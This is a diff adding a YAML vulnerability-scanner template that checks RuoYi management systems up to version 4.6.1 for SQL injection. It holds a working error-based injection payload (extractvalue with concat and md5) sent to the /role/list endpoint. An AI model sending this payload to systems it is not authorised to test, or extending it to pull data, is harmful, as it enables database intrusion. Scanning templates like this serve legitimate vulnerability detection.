@@ -1,0 +1,22 @@
+name: poc-yaml-ruoyi-management-sqli
+manual: true
+transport: http
+set:
+    r1: randomInt(800000000, 1000000000)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /role/list
+            headers: 
+                Content-Type: application/x-www-form-urlencoded
+            body: params[dataScope]=and extractvalue(rand(),concat(0x7c,md5({{r1}})))
+            follow_redirects: true
+        expression: response.status == 200 && response.body.bcontains(bytes(substr(md5(string(r1)),0,31)))
+expression: r0()
+detail:
+    author: dddd
+    links:
+        - https://zone.huoxian.cn/d/308-iastruoyisql
+    Affected Version:: "小于等于4.6.1"
